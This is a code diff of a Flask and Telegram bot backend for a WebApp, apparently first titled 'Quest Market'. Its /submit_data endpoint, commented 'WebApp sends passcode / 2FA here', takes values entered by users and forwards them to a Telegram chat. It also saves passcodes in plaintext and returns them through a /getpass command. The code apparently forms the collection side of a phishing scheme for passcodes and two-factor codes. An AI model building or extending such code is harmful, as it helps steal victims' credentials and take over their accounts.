@@ -15,43 +15,35 @@ path_static = os.path.join(path_cwd, "static")
 
 Func = Blueprint('func', __name__, static_folder=path_static, template_folder=path_templates)
 
-@Func.route('/func', methods=['GET', 'POST'])
-def func():
-    dataGet = '' if not request.get_json(force=True) else request.get_json(force=True)
-    print(dataGet)
-    dataReply = {'backend_data': 'some_data'}
-    print(dataReply)
-    return jsonify(dataReply)
-
-
 @app.route('/')
 def index():
     return "WebApp працює!"
 
 
-@app.route('/api/data', methods=['GET', 'POST'])
-def receive_data():
-    data = request.get_json()
+# Обработчик получения данных из WebApp (получаем passcode или другой введённый код)
+@bot.message_handler(content_types=['web_app_data'])
+def handle_webapp_data(message):
+    # Данные приходят в формате JSON
+    data = message.web_app_data
+    print(f"Received from WebApp: {data}")
+
+    # Если это passcode, сохраняем его
     passcode = data.get("passcode")
+    if passcode:
+        with open("temp_passcode.txt", "w") as f:
+            f.write(passcode)
+        bot.send_message(message.chat.id, f"📄 Passcode сохранен: {passcode}")
+    else:
+        bot.send_message(message.chat.id, "❌ Не удалось получить код.")
 
-    if not passcode:
-        return jsonify({"error": "no passcode"}), 400
+    # Отправляем обратно в Telegram
+    bot.send_message(message.chat.id, f"Отправлены данные: {data}")
 
-    # Save passcode to temp file
-    with open("temp_passcode.txt", "w") as f:
-        f.write(passcode)
+    # Сохраняем данные в файл для теста (если нужно)
+    with open("received_data.txt", "w") as f:
+        f.write(json.dumps(data))
 
-    print(f"[SERVER] Passcode received and saved: {passcode}")
-
-    # Read back (just to verify)
-    with open("temp_passcode.txt", "r") as f:
-        saved = f.read()
-        print(f"[SERVER] File contents: {saved}")
-
-    return jsonify({"status": "ok", "saved": saved})
-
-
-bot = telebot.TeleBot(TOKEN)
+    bot.send_message(message.chat.id, f"Дані збережено: {data}")
 
 
 # /start — показує кнопку з WebApp
@@ -66,32 +58,16 @@ def start(message):
     )
     bot.send_message(
         message.chat.id,
-        "Привіт! Натисни, щоб відкрити Quest Market:",
+        "Привіт! Натисни, щоб відкрити WebApp:",
         reply_markup=markup
     )
 
 
-# Обработчик получения данных из WebApp
-@bot.message_handler(content_types=['web_app_data'])
-def handle_webapp_data(message):
-    # Данные приходят в формате JSON
-    data = message.web_app_data
-    print(f"Received from WebApp: {data}")
-
-    # Отправка данных обратно в Telegram
-    bot.send_message(message.chat.id, f"Отримано дані: {data}")
-
-    # Сохраняем данные, если нужно
-    with open("received_data.txt", "w") as f:
-        f.write(data)
-
-    bot.send_message(message.chat.id, f"Дані збережено: {data}")
-
-
-# 🟢 AJAX endpoint — WebApp sends passcode / 2FA here
+# Endpoint для получения passcode
 @app.route("/submit_data", methods=["POST"])
 def submit_data():
     try:
+        # Получаем данные от WebApp через API
         data = request.get_json()
         action = data.get("action")
         value = data.get("value")
@@ -99,7 +75,7 @@ def submit_data():
 
         print(f"Received from WebApp: {action} = {value}")
 
-        # Optionally send confirmation message to Telegram chat
+        # Отправляем сообщение в Telegram
         if user_id:
             bot.send_message(user_id, f"✅ Got {action}: {value}")
 
@@ -109,6 +85,7 @@ def submit_data():
         return jsonify(success=False, message=str(e)), 400
 
 
+# Команда для получения сохранённого passcode
 @bot.message_handler(commands=['getpass'])
 def get_pass(message):
     try:
@@ -119,8 +96,8 @@ def get_pass(message):
         bot.send_message(message.chat.id, "❌ No passcode saved yet.")
 
 
+# Запуск бота
 print("Бот запущено! Очікуємо дані...")
-
 bot.infinity_polling()
 
 if __name__ == "__main__":
